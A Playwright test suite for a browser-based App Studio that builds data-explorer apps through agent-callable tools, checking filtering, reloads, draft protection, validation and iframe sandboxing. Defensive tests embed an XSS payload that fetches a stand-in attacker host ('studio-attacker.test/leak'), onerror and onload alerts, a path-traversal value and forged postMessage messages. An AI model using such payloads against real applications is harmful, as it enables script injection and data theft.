import { expect, test, type Page } from '@playwright/test';

async function setup(page: Page) {
	await page.addInitScript(() => {
		if (window !== window.top) return;
		const tools: Record<string, any> = {};
		Object.defineProperty(window, '__studioTools', { value: tools });
		Object.defineProperty(document, 'modelContext', {
			configurable: true,
			value: {
				registerTool(tool: any) {
					tools[tool.name] = tool;
				},
			},
		});
	});
	await page.goto('/');
	await ready(page);
}
async function ready(page: Page) {
	await page.waitForFunction(() => Boolean((window as any).__studioTools.studio_open));
}
async function call(page: Page, name: string, input: Record<string, unknown> = {}) {
	return page.evaluate(
		async ({ name, input }) => (window as any).__studioTools[name].execute(input),
		{ name, input },
	);
}
async function ok(page: Page, name: string, input: Record<string, unknown> = {}) {
	const result = await call(page, name, input);
	expect(result.structuredContent.ok, JSON.stringify(result).slice(0, 2000)).toBe(true);
	return result.structuredContent;
}
const path = '/Applications/Feedback/Feedback.app.json';
const dataPath = '/Documents/feedback.json';
const sourcePath = '/Documents/interviews.md';
const appInput = {
	path,
	title: 'Feedback explorer',
	description: 'Read the evidence behind reader feedback.',
	view: 'cards',
	dataPath,
	columns: [
		{ key: 'title', label: 'Finding' },
		{ key: 'feature', label: 'Feature' },
		{ key: 'quote', label: 'Quote' },
	],
	titleField: 'title',
	filterField: 'feature',
	sourceField: 'source',
	sourcePaths: [sourcePath],
};
const rows = [
	{
		title: 'Save for a flight',
		feature: 'Offline',
		quote: 'I need it to work on a plane.',
		source: sourcePath,
	},
	{
		title: 'Find a phrase',
		feature: 'Search',
		quote: 'I remember the words, not the file.',
		source: sourcePath,
	},
	{
		title: 'Show a download indicator',
		feature: 'Offline',
		quote: 'Tell me it is ready to read.',
		source: '/Documents/unselected.md',
	},
];
async function create(page: Page, data: unknown = rows, changes = {}) {
	await ok(page, 'files_write', {
		path: sourcePath,
		content: '# Interview evidence\n\nActual source note.\n',
		createOnly: true,
	});
	await ok(page, 'files_write', {
		path: dataPath,
		content: JSON.stringify(data),
		createOnly: true,
	});
	return ok(page, 'studio_create', { ...appInput, ...changes });
}
const preview = (page: Page) => page.frameLocator('iframe[title="App preview"]');

test('discovery and launching Studio do not create sample files', async ({ page }) => {
	await setup(page);
	const activity = await ok(page, 'activity_list');
	expect((await ok(page, 'studio_list')).apps).toEqual([]);
	expect(await ok(page, 'activity_list')).toEqual(activity);
	await page.getByRole('button', { name: 'Launch App Studio app', exact: true }).click();
	await expect(page.locator('[data-app-id="studio"]')).toContainText('Turn your data into an app.');
	expect((await ok(page, 'studio_list')).apps).toEqual([]);
});

test('saved app filters records, opens selected sources, and reloads changed data', async ({
	page,
}) => {
	await setup(page);
	await create(page);
	const frame = preview(page);
	await expect(
		frame.getByRole('heading', { name: 'Feedback explorer', exact: true }),
	).toBeVisible();
	await expect(frame.getByRole('status')).toHaveText('3 of 3 records');
	await frame.getByLabel('Feature', { exact: true }).selectOption('Offline');
	await expect(frame.getByRole('status')).toHaveText('2 of 3 records');
	await frame.getByLabel('Search records').fill('plane');
	await expect(frame.getByRole('status')).toHaveText('1 of 3 records');
	await frame.getByRole('button', { name: 'Open source', exact: true }).click();
	await expect(page.locator('[data-app-id="textedit"]')).toContainText('Actual source note.');
	await ok(page, 'studio_open', { path });
	await expect(preview(page).getByRole('button', { name: 'Source not selected' })).toBeDisabled();
	const original = await ok(page, 'files_read', { path: dataPath });
	await ok(page, 'files_write', {
		path: dataPath,
		content: JSON.stringify([
			...rows,
			{ title: 'Larger text', feature: 'Appearance', quote: 'Let me increase the font size.' },
		]),
		expectedRevision: original.revision,
	});
	await expect(page.locator('[data-app-id="studio"]')).toContainText('The data file changed.');
	await page
		.locator('[data-app-id="studio"]')
		.getByRole('button', { name: 'Reload data', exact: true })
		.click();
	await expect(preview(page).getByRole('status')).toHaveText('4 of 4 records');
	await preview(page).getByLabel('View', { exact: true }).selectOption('table');
	await expect(preview(page).getByRole('table')).toContainText('Larger text');
	await page.reload();
	await ready(page);
	await ok(page, 'studio_open', { path });
	await expect(preview(page).getByRole('status')).toHaveText('4 of 4 records');
	const result = await ok(page, 'studio_read', { path });
	expect(result.dataFile.rowCount).toBe(4);
	expect(result.data.dataPath).toBe(dataPath);
});

test('explicit starter builds a real explorer and source files', async ({ page }) => {
	await setup(page);
	await page.getByRole('button', { name: 'Launch App Studio app', exact: true }).click();
	await page.getByRole('button', { name: 'Create Feedback Explorer', exact: true }).click();
	await expect(
		preview(page).getByRole('heading', { name: 'Feedback Explorer', exact: true }),
	).toBeVisible();
	await expect(preview(page).getByRole('status')).toHaveText('4 of 4 records');
	await page.locator('[data-app-id="studio"]').screenshot({ path: '/tmp/webmcp-app-studio.png' });
	await preview(page).getByLabel('Feature', { exact: true }).selectOption('Offline reading');
	await expect(preview(page).getByRole('status')).toHaveText('2 of 4 records');
	const result = await ok(page, 'studio_read');
	expect((await ok(page, 'files_read', { path: result.data.dataPath })).content).toContain(
		'I save reading before boarding',
	);
	expect((await ok(page, 'files_read', { path: result.sources[0].path })).content).toContain(
		'fictional interviews',
	);
});

test('settings protect human drafts, stale revisions, and page navigation', async ({ page }) => {
	await setup(page);
	const created = await create(page);
	const app = page.locator('[data-app-id="studio"]');
	await app.getByRole('button', { name: 'App settings', exact: true }).click();
	await app.getByLabel('App title', { exact: true }).fill('Human app title');
	const blocked = await call(page, 'studio_update', {
		path,
		expectedRevision: created.revision,
		changes: { title: 'Agent title' },
	});
	expect(blocked.structuredContent.error.code).toBe('OPEN_DRAFT');
	expect(
		await page.evaluate(() => {
			const event = new Event('beforeunload', { cancelable: true });
			window.dispatchEvent(event);
			return event.defaultPrevented;
		}),
	).toBe(true);
	const original = await ok(page, 'files_read', { path });
	await ok(page, 'files_write', {
		path,
		content: JSON.stringify({
			...JSON.parse(original.content),
			title: 'File edited outside Studio',
		}),
		expectedRevision: original.revision,
	});
	await expect(app).toContainText('The saved app changed.');
	await expect(app.getByRole('button', { name: 'Save app', exact: true })).toBeDisabled();
	await app.getByRole('button', { name: 'Discard', exact: true }).click();
	const stale = await call(page, 'studio_update', {
		path,
		expectedRevision: created.revision,
		changes: { title: 'Stale title' },
	});
	expect(stale.structuredContent.error.code).toBe('FILE_CHANGED');
	const fresh = await ok(page, 'studio_read', { path });
	await ok(page, 'studio_update', {
		path,
		expectedRevision: fresh.revision,
		changes: { title: 'Saved title' },
	});
	await expect(
		preview(page).getByRole('heading', { name: 'Saved title', exact: true }),
	).toBeVisible();
});

test('hostile data stays text and cannot fetch, execute code, or open unselected files', async ({
	page,
}) => {
	await setup(page);
	const requests: string[] = [];
	await page.route('https://studio-attacker.test/**', async (route) => {
		requests.push(route.request().url());
		await route.fulfill({ body: 'unexpected' });
	});
	const attack =
		'</script><script>parent.document.body.dataset.stolen="yes";fetch("https://studio-attacker.test/leak")</script><img src="https://studio-attacker.test/pixel" onerror="alert(1)">';
	await create(page, [
		{
			title: attack,
			feature: 'Unsafe-looking text',
			quote: '<svg onload="alert(1)">',
			source: '/System/home.json',
			privateUnselectedField: 'This field must stay out of the preview snapshot.',
		},
	]);
	await expect(preview(page).getByRole('heading', { level: 2 })).toHaveText(attack);
	await expect(preview(page).locator('img,svg')).toHaveCount(0);
	expect(await page.locator('iframe[title="App preview"]').getAttribute('srcdoc')).not.toContain(
		'This field must stay out of the preview snapshot.',
	);
	await expect(preview(page).getByRole('button', { name: 'Source not selected' })).toBeDisabled();
	const frame = page.frames().find((frame) => frame.url() === 'about:srcdoc')!;
	const result = await frame.evaluate(async () => {
		let parentDenied = false,
			storageDenied = false,
			fetchBlocked = false;
		try {
			void parent.document.body;
		} catch {
			parentDenied = true;
		}
		try {
			void localStorage.getItem('x');
		} catch {
			storageDenied = true;
		}
		try {
			await fetch('https://studio-attacker.test/fetch');
		} catch {
			fetchBlocked = true;
		}
		return {
			parentDenied,
			storageDenied,
			fetchBlocked,
			toolsAbsent: Object.keys((window as any).__studioTools ?? {}).length === 0,
		};
	});
	expect(result).toEqual({
		parentDenied: true,
		storageDenied: true,
		fetchBlocked: true,
		toolsAbsent: true,
	});
	expect(requests).toEqual([]);
	expect(await page.locator('body').getAttribute('data-stolen')).toBeNull();
	await expect(page.locator('iframe[title="App preview"]')).toHaveAttribute(
		'sandbox',
		'allow-scripts',
	);
	const policy = await preview(page)
		.locator('meta[http-equiv="Content-Security-Policy"]')
		.getAttribute('content');
	expect(policy).toContain("connect-src 'none'");
	expect(policy).toContain("script-src 'nonce-");
	expect(policy).not.toContain('unsafe-inline');
	await page.evaluate(() =>
		window.postMessage(
			{ type: 'studio:open-source', token: 'forged', path: '/Documents/interviews.md' },
			location.origin,
		),
	);
	await expect(page.locator('[data-app-id="textedit"]')).toHaveCount(0);
});

test('false and zero titles remain visible; missing inherited fields remain empty', async ({
	page,
}) => {
	await setup(page);
	await create(page, [{ title: 0 }, { title: false }, {}], {
		columns: [
			{ key: 'title', label: 'Title' },
			{ key: 'toString', label: 'Missing value' },
		],
		filterField: 'toString',
	});
	await expect(preview(page).getByRole('heading', { name: '0', exact: true })).toBeVisible();
	await expect(preview(page).getByRole('heading', { name: 'false', exact: true })).toBeVisible();
	await expect(
		preview(page).getByRole('heading', { name: 'Untitled record', exact: true }),
	).toBeVisible();
	await expect(preview(page).locator('body')).not.toContainText('native code');
	await preview(page)
		.getByLabel('Missing value', { exact: true })
		.selectOption({ label: '(Empty)' });
	await expect(preview(page).getByRole('status')).toHaveText('3 of 3 records');
});

test('invalid app settings and oversized or malformed data are rejected without replacement', async ({
	page,
}) => {
	await setup(page);
	const created = await create(page);
	for (const changes of [
		{ script: 'alert(1)' },
		{ dataPath: '/Documents/../System/home.json' },
		{ sourcePaths: ['/System/home.json'] },
		{ columns: [{ key: 'constructor', label: 'Bad' }] },
		{ columns: [{ key: 'title', label: 'Bad\nlabel' }] },
	]) {
		const result = await call(page, 'studio_update', {
			path,
			expectedRevision: created.revision,
			changes,
		});
		expect(result.structuredContent.ok).toBe(false);
	}
	const current = await ok(page, 'studio_read', { path });
	expect(current.revision).toBe(created.revision);
	const original = await ok(page, 'files_read', { path: dataPath });
	await ok(page, 'files_write', {
		path: dataPath,
		content: JSON.stringify(Array.from({ length: 1001 }, () => ({ title: 'Record' }))),
		expectedRevision: original.revision,
	});
	const tooLarge = await call(page, 'studio_create', {
		...appInput,
		path: '/Applications/Too many.app.json',
	});
	expect(tooLarge.structuredContent.error.message).toContain('1000');
	const data = await ok(page, 'files_read', { path: dataPath });
	await ok(page, 'files_write', {
		path: dataPath,
		content: '{broken',
		expectedRevision: data.revision,
	});
	await page
		.locator('[data-app-id="studio"]')
		.getByRole('button', { name: 'Reload data', exact: true })
		.click();
	await expect(page.locator('[data-app-id="studio"]')).toContainText('App preview unavailable');
	await expect(page.locator('iframe[title="App preview"]')).toHaveCount(0);
	expect((await ok(page, 'studio_read', { path })).dataFile.error).toContain('valid JSON');
});

test('human settings save a new layout without changing data and survive reopening', async ({
	page,
}) => {
	await setup(page);
	await create(page);
	const original = await ok(page, 'files_read', { path: dataPath });
	const app = page.locator('[data-app-id="studio"]');
	await app.getByRole('button', { name: 'App settings', exact: true }).click();
	await app.getByLabel('App title', { exact: true }).fill('Interview comparison');
	await app.getByLabel('Default view', { exact: true }).selectOption('table');
	await app.getByRole('button', { name: 'Save app', exact: true }).click();
	await expect(app.getByRole('dialog')).toHaveCount(0);
	await expect(preview(page).getByRole('table')).toBeVisible();
	await expect(
		preview(page).getByRole('heading', { name: 'Interview comparison', exact: true }),
	).toBeVisible();
	expect((await ok(page, 'files_read', { path: dataPath })).revision).toBe(original.revision);
	await page.reload();
	await ready(page);
	await ok(page, 'studio_open', { path });
	await expect(preview(page).getByRole('table')).toBeVisible();
	expect((await ok(page, 'studio_read', { path })).data).toMatchObject({
		title: 'Interview comparison',
		view: 'table',
	});
});

test('source bridge rejects forged senders, stale tokens, and unselected paths', async ({
	page,
}) => {
	await setup(page);
	await create(page);
	await expect(preview(page).getByRole('status')).toHaveText('3 of 3 records');
	const frame = page.frames().find((frame) => frame.url() === 'about:srcdoc')!;
	const token: string = await frame.evaluate('token');
	await page.evaluate(
		({ token, sourcePath }) =>
			window.postMessage({ type: 'studio:open-source', token, path: sourcePath }, location.origin),
		{ token, sourcePath },
	);
	await frame.evaluate(
		({ token, sourcePath }) => {
			parent.postMessage(
				{ type: 'studio:open-source', token: 'retired-preview', path: sourcePath },
				'*',
			);
			parent.postMessage(
				{ type: 'studio:open-source', token, path: '/Documents/unselected.md' },
				'*',
			);
			parent.postMessage(
				{ type: 'studio:open-source', token, path: sourcePath, execute: 'extra field' },
				'*',
			);
		},
		{ token, sourcePath },
	);
	await page.evaluate(
		() =>
			new Promise<void>((resolve) =>
				requestAnimationFrame(() => requestAnimationFrame(() => resolve())),
			),
	);
	await expect(page.locator('[data-app-id="textedit"]')).toHaveCount(0);
	await ok(page, 'files_trash', { path: sourcePath });
	await page
		.locator('[data-app-id="studio"]')
		.getByRole('button', { name: 'Reload data', exact: true })
		.click();
	await expect(
		preview(page).getByRole('button', { name: 'Source missing', exact: true }).first(),
	).toBeDisabled();
	await expect(
		preview(page).getByRole('button', { name: 'Source not selected', exact: true }),
	).toBeDisabled();
	expect((await ok(page, 'studio_read', { path })).sources).toEqual([
		{ path: sourcePath, exists: false },
	]);
});
